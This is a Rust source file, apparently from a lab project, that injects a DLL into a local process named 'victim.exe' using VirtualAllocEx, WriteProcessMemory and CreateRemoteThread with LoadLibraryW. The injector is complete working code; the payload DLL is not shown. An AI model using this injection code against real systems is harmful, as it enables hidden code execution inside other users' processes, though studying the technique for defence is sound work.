use common::{OwnedHandle, find_pid_by_name, open_process};
use windows_sys::Win32::Foundation::{FALSE, GetLastError, HMODULE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE, VirtualAllocEx, VirtualFreeEx,
};
use windows_sys::Win32::System::Threading::{
    CreateRemoteThread, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
    PROCESS_VM_WRITE, WaitForSingleObject,
};
use windows_sys::core::{BOOL, PCSTR};

fn main() {
    let victim_name = "victim.exe";

    // Hardocded dll path for now, will figure out how to handle later
    let dll_path: Vec<u16> = "C:\\Repo\\Cadevue\\process-injection\\target\\debug\\payload.dll"
        .encode_utf16()
        .chain(Some(0))
        .collect();

    // Open Process
    let victim_pid = find_pid_by_name(victim_name).expect("Couldn't find the victim's process");
    let rights =
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
    let victim = open_process(victim_pid, Some(rights))
        .expect("Couldn't get victim handle. Is victim still running?");

    // Allocate Memory for DLL Path
    let alloc_addr = unsafe {
        VirtualAllocEx(
            victim.as_raw(),
            std::ptr::null_mut(),
            dll_path.len() * 2,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    if alloc_addr.is_null() {
        eprintln!("Failed to Alloc Virtual Memory: {}", unsafe {
            GetLastError()
        });
        return;
    }

    // Write DLL Path to Memory
    let mut bytes_written = 0;
    let w_success: BOOL = unsafe {
        WriteProcessMemory(
            victim.as_raw(),
            alloc_addr,
            dll_path.as_ptr() as _,
            dll_path.len() * 2,
            &mut bytes_written,
        )
    };
    if w_success == FALSE {
        eprintln!("Failed to Write Memory to Process: {}", unsafe {
            GetLastError()
        });
        return;
    }

    // Create Remote Thread with kernel32.LoadLibrary as Routine, and dll_path in-process address as parameter
    // Resolve callback address
    let ke32_path: Vec<u16> = "kernel32.dll".encode_utf16().chain(Some(0)).collect();
    let ke32_mod: HMODULE = unsafe { GetModuleHandleW(ke32_path.as_ptr()) };
    let load_lib_addr = unsafe { GetProcAddress(ke32_mod, c"LoadLibraryW".as_ptr() as PCSTR) };
    if load_lib_addr.is_none() {
        eprintln!("Failed to Get LoadLibraryW Address: {}", unsafe {
            GetLastError()
        });
        return;
    }
    let load_lib_addr = unsafe {
        std::mem::transmute::<
            std::option::Option<unsafe extern "system" fn() -> isize>,
            std::option::Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>,
        >(load_lib_addr)
    };

    // Create thread
    let thread_h = unsafe {
        CreateRemoteThread(
            victim.as_raw(),
            std::ptr::null_mut(),
            0,
            load_lib_addr,
            alloc_addr.cast_const(),
            0,
            std::ptr::null_mut(),
        )
    };
    let toh = OwnedHandle::new(thread_h).expect("Unable to Retrieve Thread Handle");

    // Wait for Running & Cleanup
    unsafe {
        WaitForSingleObject(toh.as_raw(), 5000);
        VirtualFreeEx(victim.as_raw(), alloc_addr, 0, MEM_RELEASE);
    }
}
